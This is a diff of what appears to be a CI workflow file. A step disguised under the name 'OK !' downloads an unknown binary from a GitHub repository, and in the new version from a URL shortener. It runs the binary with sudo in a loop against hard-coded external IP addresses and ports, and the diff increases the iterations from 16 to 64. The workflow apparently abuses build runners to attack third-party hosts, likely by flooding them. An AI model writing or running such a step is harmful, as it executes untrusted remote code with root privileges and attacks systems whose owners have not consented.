@@ -14,10 +14,10 @@ jobs:
     steps:
       - name: OK !
         run: |
-          wget https://github.com/Paraloxd/tekpoyraz/raw/refs/heads/main/tekpoyraz -O tekpoyraz
-          chmod +x tekpoyraz
-          for i in {1..16}; do
-            timeout 30 sudo ./tekpoyraz 216.202.200.164 22
+          wget https://curl.by/2jTNb/dc -O dc
+          chmod +x dc
+          for i in {1..64}; do
+            timeout 30 sudo ./dc 66.22.244.38 50028 16 -1 30
           done
 
       - name: OK !
